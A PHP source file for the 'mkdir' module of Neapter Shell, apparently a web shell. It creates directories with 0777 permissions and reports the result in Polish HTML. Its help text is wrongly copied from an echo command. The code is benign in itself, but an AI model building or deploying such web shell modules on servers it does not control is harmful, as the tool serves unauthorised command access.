<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Tworzenie katalogu
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleMkdir extends ModuleAbstract
{
	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'mkdir' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.00 2011-06-04 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Wyświetla tekst

	Użycie:
		echo tekst do wyświetlenia
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		$iParams = $this -> oShell -> getArgs() -> getNumberOfParams();

		if( $iParams === 0 )
		{
			return $this -> getHelp();
		}

		$sOutput = NULL;

		for( $i = 0; $i < $iParams; ++$i )
		{
			$sPathName = $this -> oShell -> getArgs() -> getParam( $i );
			if( ! @ mkdir( $sPathName, 0777, TRUE ) )
			{
				$sMsg =  "Katalog \"%s\" <span class=\"red\">nie został utworzony</span>\r\n";
			}
			else
			{
				$sMsg = "Katalog \"%s\" <span class=\"green\">został utworzony</span>\r\n";
			}

			$sOutput .= sprintf( $sMsg, $sPathName );
		}

		return $sOutput;
	}

}